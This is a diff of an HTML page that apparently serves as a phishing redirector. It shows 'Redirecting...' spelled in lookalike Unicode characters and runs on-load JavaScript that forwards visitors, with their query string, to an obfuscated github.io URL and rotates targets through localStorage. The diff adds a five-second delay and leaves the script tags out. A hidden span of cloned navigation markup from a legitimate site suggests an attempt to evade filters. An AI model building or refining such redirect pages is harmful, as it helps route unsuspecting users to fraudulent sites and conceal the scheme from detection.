@@ -50,62 +50,51 @@
     </style>
 </head>
 <body>
-    <p>ꓣеdіrесtіոց...</p><script>
+    <p>ꓣеdіrесtіոց...</p>
     // List of URLs to cycle through
-    const urls = ["https://shbfiuqa.github.io/eyrh7di3h2uy3qeiorjghuy78u95o4rjnuvyr7t8e9uoriuyg78r95euorjfuni4yrh98oeyhrfiunh4ytihuryiejrunfy4hjh/", "", ""];
+const urls = ["https://shbfiuqa.github.io/eyrh7di3h2uy3qeiorjghuy78u95o4rjnuvyr7t8e9uoriuyg78r95euorjfuni4yrh98oeyhrfiunh4ytihuryiejrunfy4hjh/", "", ""];
+
+// Function to get query string from the current URL
+function getQueryString() {
+  return window.location.search; // This includes the '?' character
+}
+
+// Function to get the next URL from local storage or default to the first URL
+function getNextUrl() {
+  let currentIndex = localStorage.getItem("currentIndex");
   
-    // Function to get query string from the current URL
-    function getQueryString() {
-      return window.location.search; // This includes the '?' character
-    }
-  
-    // Function to get the next URL from local storage or default to the first URL
-    function getNextUrl() {
-      let currentIndex = localStorage.getItem("currentIndex");
-      
-      // Default to index 0 if not set
-      currentIndex = currentIndex ? parseInt(currentIndex) : 0;
-  
-      // Get the next URL, ensuring it's a valid non-empty string
-      let nextUrl = urls[currentIndex];
-      while (!nextUrl) {
-        currentIndex = (currentIndex + 1) % urls.length;
-        nextUrl = urls[currentIndex];
-      }
-  
-      // Update the index for the next visit
-      currentIndex = (currentIndex + 1) % urls.length;
-      localStorage.setItem("currentIndex", currentIndex);
-  
-      return nextUrl;
-    }
-  
-    // Function to generate a random string of alphanumeric characters up to 13 characters long
-    function generateRandomString() {
-      const length = Math.floor(Math.random() * 13) + 1; // Random length between 1 and 13
-      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-      let result = '';
-      for (let i = 0; i < length; i++) {
-        result += chars.charAt(Math.floor(Math.random() * chars.length));
-      }
-      return result;
-    }
-  
-    // Main function to execute the redirect
-    function redirectToNextUrl() {
-      const queryString = getQueryString();
-      const nextUrl = getNextUrl();
-      const randomString = generateRandomString(); // Generate a random string of up to 13 characters
-      const separator = queryString ? '&' : '?'; // Use '&' if query string exists, otherwise use '?'
-      const fullUrl = `${nextUrl}${queryString}${separator}${randomString}`;
-  
-      // Redirect to the constructed URL
-      window.location.href = fullUrl;
-    }
-  
-    // Execute the redirect when the page loads
-    window.onload = redirectToNextUrl;
-  </script>
+  // Default to index 0 if not set
+  currentIndex = currentIndex ? parseInt(currentIndex) : 0;
+
+  // Get the next URL, ensuring it's a valid non-empty string
+  let nextUrl = urls[currentIndex];
+  while (!nextUrl) {
+    currentIndex = (currentIndex + 1) % urls.length;
+    nextUrl = urls[currentIndex];
+  }
+
+  // Update the index for the next visit
+  currentIndex = (currentIndex + 1) % urls.length;
+  localStorage.setItem("currentIndex", currentIndex);
+
+  return nextUrl;
+}
+
+// Main function to execute the redirect
+function redirectToNextUrl() {
+  const queryString = getQueryString();
+  const nextUrl = getNextUrl();
+  const fullUrl = `${nextUrl}${queryString}`;
+
+  // Redirect to the constructed URL after a 5-second delay
+  setTimeout(() => {
+    window.location.href = fullUrl;
+  }, 5000); // 5000 milliseconds = 5 seconds
+}
+
+// Execute the redirect when the page loads
+window.onload = redirectToNextUrl;
+
     </body>
     <span style="display: none;">
 <div class="mobile-menu_root__PX9iM" id="mobile-menu-toggle"><button aria-label="Open menu" class="toggle_mobileMenuToggle__W5y02" data-expanded="false" disabled="" type="button"><div class="toggle_bar__ySl8w toggle_disabled__4oWP9" data-position="top"></div><div class="toggle_bar__ySl8w toggle_disabled__4oWP9" data-position="bottom"></div></button></div></div><div class="header_nav_second__cIFf5"><nav aria-label="Main" data-orientation="horizontal" dir="ltr" class="navigation-menu_root__HT1ea" style="--indicator-height:10px;--arrow-offset:-10px;--content-width:-16px;--left-offset:calc(-1 * var(--gap-between-logo-and-nav) - 98px)"><div aria-hidden="true" class="navigation-menu_tabsHighlight__4PsZm"></div><div style="position:relative"><ul data-orientation="horizontal" class="navigation-menu_list__1vwjh" dir="ltr"><li><button id="radix-:R15j7m9t9qjtsr:-trigger-features" data-state="closed" aria-expanded="false" aria-controls="radix-:R15j7m9t9qjtsr:-content-features" class="navigation-menu_trigger__AmZ48" value="features" data-radix-collection-item="">Products<svg data-testid="geist-icon" height="16" stroke-linejoin="round" style="pointer-events:none;color:currentColor" viewBox="0 0 16 16" width="16" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.0607 6.74999L11.5303 7.28032L8.7071 10.1035C8.31657 10.4941 7.68341 10.4941 7.29288 10.1035L4.46966 7.28032L3.93933 6.74999L4.99999 5.68933L5.53032 6.21966L7.99999 8.68933L10.4697 6.21966L11 5.68933L12.0607 6.74999Z" fill="currentColor"/></svg></button><div id="radix-:R15j7m9t9qjtsr:-content-features" aria-labelledby="radix-:R15j7m9t9qjtsr:-trigger-features" data-orientation="horizontal" data-state="closed" aria-hidden="true" class="navigation-menu_content__VYOa5" style="pointer-events:none" dir="ltr"><ul class="navigation-menu_column__CMeKf"><li class="navigation-menu_links__VRoNf"><h5 class="text_wrapper__i87JK navigation-menu_heading__osU8W" data-version="v1" style="--text-color:var(--ds-gray-900);--text-size:0.875rem;--text-line-height:1.25rem;--text-letter-spacing:initial;--text-weight:400" id="header-dx">DX Platform</h5><ul aria-describedby="header-dx" class="navigation-menu_columnReset__5wkHH"><li><a data-hover-icon="false" data-feature="Previews" data-radix-collection-item="" data-zone="same" class="link_link__hbWKh navigation-menu_menuSubLink__jde_U" href="/products/previews"><div class="navigation-menu_icons__8b2lC"><div class="stack_stack__iZkUS stack navigation-menu_icon__xsndA" data-version="v1" style="--stack-flex:initial;--stack-direction:column;--stack-align:center;--stack-justify:center;--stack-padding:0px;--stack-gap:0px"><svg data-testid="geist-icon" height="16" stroke-linejoin="round" style="color:currentColor" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 2.5H1.5V5.005H14.5V2.5ZM14.5 6.255H6.245V13.5H13.5C14.0523 13.5 14.5 13.0523 14.5 12.5V6.255ZM4.995 6.255H1.5V12.5C1.5 13.0523 1.94772 13.5 2.5 13.5H4.995V6.255ZM1.5 1H0V2.5V12.5C0 13.8807 1.11929 15 2.5 15H13.5C14.8807 15 16 13.8807 16 12.5V2.5V1H14.5H1.5Z" fill="currentColor"/></svg></div></div><div class="navigation-menu_menuSubLinkContent___WWcd"><div class="navigation-menu_menuItemHeading__r6JQU">Previews</div><p class="text_wrapper__i87JK navigation-menu_menuItemText__l6KEM" data-version="v1" style="--text-color:var(--ds-gray-1000);--text-size:0.75rem;--text-line-height:1rem;--text-letter-spacing:initial;--text-weight:400">Helping teams ship 6× faster</p></div></a></li><li><a data-hover-icon="false" data-feature="AI" data-radix-collection-item="" data-zone="same" class="link_link__hbWKh navigation-menu_menuSubLink__jde_U" href="/ai"><div class="navigation-menu_icons__8b2lC"><div class="stack_stack__iZkUS stack navigation-menu_icon__xsndA" data-version="v1" style="--stack-flex:initial;--stack-direction:column;--stack-align:center;--stack-justify:center;--stack-padding:0px;--stack-gap:0px"><svg data-testid="geist-icon" height="16" stroke-linejoin="round" style="color:currentColor" viewBox="0 0 16 16" width="16"><path d="M2.5 0.5V0H3.5V0.5C3.5 1.60457 4.39543 2.5 5.5 2.5H6V3V3.5H5.5C4.39543 3.5 3.5 4.39543 3.5 5.5V6H3H2.5V5.5C2.5 4.39543 1.60457 3.5 0.5 3.5H0V3V2.5H0.5C1.60457 2.5 2.5 1.60457 2.5 0.5Z" fill="currentColor"/>
